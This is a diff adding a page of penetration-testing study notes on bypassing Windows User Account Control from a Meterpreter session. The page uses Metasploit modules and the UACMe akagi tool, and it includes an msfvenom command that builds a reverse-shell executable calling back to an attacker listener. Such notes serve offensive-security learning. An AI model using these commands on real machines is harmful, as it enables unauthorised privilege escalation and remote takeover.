@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./pts.css">
+    <title>system and host attacks bypassing uac on windows</title>
+</head>
+<body>
+    <header class="navbar">
+        <a href="https://github.com/puzz00" target="_blank"><img src="./images/chess_1.jpg" alt="black or white?"></a>
+        <h1>bypassing uac</h1>
+        <nav class="links">
+            <ul>
+                <li><a href="./index.html">home</a></li>
+                <li><a href="./host_and_network_pen_testing.html">host and network</a></li>
+                <li><a href="./system_and_host_attacks.html">system and host attacks</a></li>
+                <li><a href="./win_pe.html">win priv esc</a></li>
+                <li><a class="active" href="#">uac</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="main-content">
+        <h2>Introduction</h2>
+        <p>
+            If we have gained a meterpreter session on a windows machine, a quick way to attempt to gain NT AUTHORITY\SYSTEM (the most powerful non-interactive session) is to use the command: <code>getsystem</code> though this does not always work and may well crash the remote machine so it needs to be used with caution. This command tries different techniques to do priv esc. It only work on Windows. If we want to only try a specific way to do priv esc, we can use the -t flag along with the number of the technique: <code>getsystem -t 1</code> One problem we may encounter is if User Account Control is enabled. We can find this out by using: <code>post/windows/gather/win_privs</code> If the UAC Enabled column is set to True, we will need to try to bypass this before running getsystem. We will need to background the meterpreter session and then use: <code>search bypassuac</code> We can use the latest bypassuac module against the meterpreter session id: <code>use exploit/windows/local/bypassuac</code> followed by: <code>set session 2</code> or whatever session id we are targetting. If this works when we run it, a new meterpreter session will open. We will then be able to interact with it and try to run the getsystem command again.
+        </p>
+        <p>
+            Another way to attempt to bypass uac via a meterpreter session is to background the session and then try: <code>use post/multi/recon/local_exploit_suggester</code> which will list various techniques we can try. We can try these in turn until we find one which works, for example: <code>use exploit/windows/local/bypassuac_dotnet_profiler</code>
+        </p>
+        <h2>UAC</h2>
+        <p>
+            User Account Control is a security feature in windows which opens a prompt when a user attempts to execute a file or command which require elevated privileges. If a low level user attempts this, the uac credential prompt will ask for a local admin username:password and if a local admin account attempts it, the consent prompt will ask for confirmation. Either way, if we are interacting with the victim machine via a meterpreter or cmd session, we will not be able to continue as we will not be able to respond to the uac prompt. This means we need to find ways to bypass uac completely. In order to do this, we will need to have a session for a user who is in the local admin group on the victim machine. The technique which we use to bypass uac will depend on the os version and build running on the victim machine.
+        </p>
+        <h2>UACMe</h2>
+        <p>
+            UACMe is a tool we can find @ <a class="main-links" href="https://github.com/hfiref0x/UACME" target="_blank">UACMe</a> It has lots of ways to bypass uac - we will need to find one which works for the windows environment we are targeting. UACMe works by abusing the inbuilt Windows AutoElevate tool. It uses an executable called akagi. The binary will need to be compiled from the source code in the github repository as it is written mostly in C.
+        </p>
+        <p>
+            The akagi binary can be used to bypass uac and then run another executable such as a malicious reverse shell. We can generate a reverse meterpreter shell using: <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.8 LPORT=1234 -f exe > rs.exe</code> We then need to transfer this reverse shell along with the akagi binary to the victim machine before starting a handler with msfconsole which uses the same payload as we used in the reverse shell: <code>set payload windows/meterpreter/reverse_tcp</code>
+        </p>
+        <p>
+            Once we have transfered the necessary files to the victim machine and started a handler, we can use: <code>.\Akagi64.exe 23 C:\Temp\rs.exe</code> (the first paramater passed to the akagi binary is the number of the exploit to try - this will depend on the environment we find on the vitim machine - 33 is a good one to try against windows 10 machines). This will hopefully execute the reverse shell which has been specified as the second parameter with elevated privileges since uac has been bypassed.
+        </p>
+    </section>
+    <section class="extra-info">
+        <p class="tagline">
+            water shapes its course according to the nature of the ground over which it flows - the soldier works out his victory in relation to the foe whom he is facing
+        </p>
+        <div class="contact">
+            <p>puzz00</p>
+            <a href="https://github.com/puzz00" class="active" target="_blank">knock knock</a>
+        </div>
+    </section>
+</body>
+</html>
